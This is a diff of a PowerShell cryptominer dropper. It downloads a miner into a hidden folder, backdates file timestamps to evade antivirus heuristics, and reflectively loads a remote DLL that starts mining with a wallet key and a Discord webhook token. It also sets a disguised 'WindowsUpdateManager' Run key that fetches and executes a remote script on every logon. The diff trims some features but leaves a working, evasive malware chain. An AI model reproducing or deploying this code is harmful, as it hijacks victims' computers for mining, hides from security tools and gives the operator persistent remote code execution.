@@ -2,9 +2,6 @@
 $GithubUser = "HolyV200"
 $RepoName = "ultaV2"
 $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
-$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
-$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
-$AmdMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Win64.zip"
 $Wallet = "1871092382" # Mining Key
 $Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"
 
@@ -15,8 +12,6 @@ if (-not (Test-Path $StealthDir)) {
     New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
 }
 
-$CpuZip = Join-Path $StealthDir "update_c.zip"
-$GpuZip = Join-Path $StealthDir "update_g.zip"
 $CpuExe = Join-Path $StealthDir "win_sys_x.exe"
 $GpuExe = Join-Path $StealthDir "win_sys_g.exe"
 
@@ -26,15 +21,11 @@ $wc = New-Object System.Net.WebClient
 # 1. Handle CPU Miner (DIRECT DOWNLOAD + TIMESTOMP)
 if (-not (Test-Path $CpuExe)) {
     try {
-        # Use a direct link to a raw pre-renamed binary to bypass ZIP extraction detection
-        $RawMinerUrl = "https://github.com/HolyV200/ultaV2/raw/main/win_sys_x.exe"
+        $RawMinerUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_x.exe"
         $wc.DownloadFile($RawMinerUrl, $CpuExe)
-        
-        # Timestomp: Make it look old (2019) to bypass "New File" heuristic scans
         $OldDate = Get-Date -Year 2019 -Month 5 -Day 14
         (Get-Item $CpuExe).CreationTime = $OldDate
         (Get-Item $CpuExe).LastWriteTime = $OldDate
-        (Get-Item $CpuExe).LastAccessTime = $OldDate
     } catch { }
 }
 
@@ -49,50 +40,21 @@ try {
     }
 } catch { }
 
-if (($NvidiaGpu -or $AmdGpu) -and -not (Test-Path $GpuExe)) {
-    try {
-        $TargetUrl = if ($NvidiaGpu) { $GpuMinerUrl } else { $AmdMinerUrl }
-        $wc.DownloadFile($TargetUrl, $GpuZip)
-        $TempDir = Join-Path $StealthDir "temp_g"
-        Expand-Archive -Path $GpuZip -DestinationPath $TempDir -Force
-        $Filter = if ($NvidiaGpu) { "miner.exe" } else { "lolMiner.exe" }
-        $Unzipped = Get-ChildItem -Path $TempDir -Filter $Filter -Recurse | Select-Object -First 1
-        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
-        Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
-    } catch { }
-}
-
 # --- REFLECTIVE LOADING ---
 try {
     $dllBytes = $wc.DownloadData($DllUrl)
     $assembly = [System.Reflection.Assembly]::Load($dllBytes)
     $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
     $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))
-    
     $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
     $IsAmd = if ($AmdGpu) { "true" } else { "false" }
-    
     $combinedArgs = "$CpuExe|$GpuArg|$Wallet|$IsAmd|$Webhook"
-    $invokeArgs = New-Object System.Object[] 1
-    $invokeArgs[0] = [string]$combinedArgs
-    
-    $startMethod.Invoke($null, $invokeArgs)
-} catch {
-    Write-Host "Initialization failed: $($_.Exception.Message)"
-}
+    $startMethod.Invoke($null, @([string]$combinedArgs))
+} catch { }
 
-# --- PERSISTENCE ---
+# --- USER-MODE PERSISTENCE (NO ADMIN NEEDED) ---
 try {
-    $RegPolicyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-    if (-not (Test-Path $RegPolicyPath)) { New-Item -Path $RegPolicyPath -Force | Out-Null }
-    Set-ItemProperty -Path $RegPolicyPath -Name "DisableRegistryTools" -Value 1 -Type DWord
-
-    $TaskName = "WinSysMaintenance"
-    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1 | iex`""
-    $Trigger = New-ScheduledTaskTrigger -AtLogOn
-    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-    $Trigger.RepetitionInterval = (New-TimeSpan -Hours 12)
-    $Trigger.RepetitionDuration = [TimeSpan]::MaxValue
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
+    $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $Payload = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1')`""
+    Set-ItemProperty -Path $RunKey -Name "WindowsUpdateManager" -Value $Payload
 } catch { }
